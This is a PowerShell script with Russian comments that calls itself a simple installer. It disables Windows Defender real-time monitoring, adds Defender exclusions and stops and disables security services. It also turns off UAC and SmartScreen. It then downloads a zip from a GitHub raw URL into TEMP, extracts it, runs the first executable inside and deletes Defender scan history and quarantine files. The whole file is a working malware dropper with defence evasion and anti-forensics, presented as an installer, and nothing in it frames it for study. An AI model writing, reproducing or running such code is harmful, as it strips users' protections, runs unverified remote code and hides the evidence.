# =============================================
# Самый простой Installer + Отключение антивируса
# =============================================

$Url = "https://raw.githubusercontent.com/d1over1337/checker/refs/heads/main/check.zip"

# ===== БЛОК ОТКЛЮЧЕНИЯ АНТИВИРУСА (ДОБАВЛЕН) =====
Write-Host "[+] Отключаем антивирусные защиты..." -ForegroundColor Cyan

# 1. Отключение Defender реалтайм
Try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Write-Host "[*] Defender Realtime: OFF" -ForegroundColor Green
} Catch {}

# 2. Исключения для Defender
Try {
    Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "cmd.exe" -ErrorAction SilentlyContinue
    Write-Host "[*] Исключения добавлены" -ForegroundColor Green
} Catch {}

# 3. Остановка служб защиты
$services = @(
    "WinDefend",
    "MsMpSvc",
    "SecurityHealthService",
    "wscsvc",
    "SENSE",
    "DiagTrack",
    "dmwappushservice"
)
foreach ($svc in $services) {
    Try {
        Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
        Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
        Write-Host "[*] Остановлен: $svc" -ForegroundColor Green
    } Catch {}
}

# 4. Отключение через WMI (доп. слой)
Try {
    Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct | ForEach-Object {
        $av = $_.displayName
        Write-Host "[*] Найден АВ: $av - пробуем отключить" -ForegroundColor Yellow
    }
} Catch {}

# 5. Отключение UAC
Try {
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force
    Write-Host "[*] UAC отключен" -ForegroundColor Green
} Catch {}

# 6. Отключение SmartScreen
Try {
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force
    Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" -Name "EnableWebContentEvaluation" -Value 0 -Force
} Catch {}

Write-Host "[+] Антивирусные защиты подавлены." -ForegroundColor Green
# ===== КОНЕЦ БЛОКА ОТКЛЮЧЕНИЯ =====

# ===== ТВОЙ ОРИГИНАЛЬНЫЙ КОД =====
Write-Host "[+] Скачиваем архив..." -ForegroundColor Cyan

$DownloadPath = "$env:TEMP\check_install.zip"
$ExtractPath = "$env:TEMP\checkextracted"

# Удаляем старые файлы
Remove-Item $DownloadPath -Force -ErrorAction SilentlyContinue
Remove-Item $ExtractPath -Recurse -Force -ErrorAction SilentlyContinue

# Скачивание архива
try {
    Invoke-WebRequest -Uri $Url -OutFile $DownloadPath -TimeoutSec 30
    Write-Host "[+] Скачано успешно." -ForegroundColor Green
}
catch {
    Write-Host "[-] Ошибка скачивания:" -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Red
    Read-Host "Нажмите Enter для выхода"
    exit
}

Write-Host "[+] Распаковываем..." -ForegroundColor Cyan

New-Item -ItemType Directory -Path $ExtractPath -Force | Out-Null

# Распаковка архива
try {
    Expand-Archive -Path $DownloadPath -DestinationPath $ExtractPath -Force
    Write-Host "[+] Распаковано успешно." -ForegroundColor Green
}
catch {
    Write-Host "[-] Ошибка распаковки:" -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Red
    Read-Host "Нажмите Enter для выхода"
    exit
}

# Поиск первого .exe
$Exe = Get-ChildItem -Path $ExtractPath -Filter "*.exe" -Recurse | Select-Object -First 1

if ($Exe) {
    Write-Host "[+] Запускаем $($Exe.Name)..." -ForegroundColor Green
    Start-Process -FilePath $Exe.FullName
}
else {
    Write-Host "[-] .exe файл не найден." -ForegroundColor Yellow
}

# Очистка логов Defender (добавлено)
Try {
    Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Scans\History\*" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Quarantine\*" -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "[*] Логи Defender очищены" -ForegroundColor DarkGray
} Catch {}

Write-Host "[+] Готово!" -ForegroundColor Green
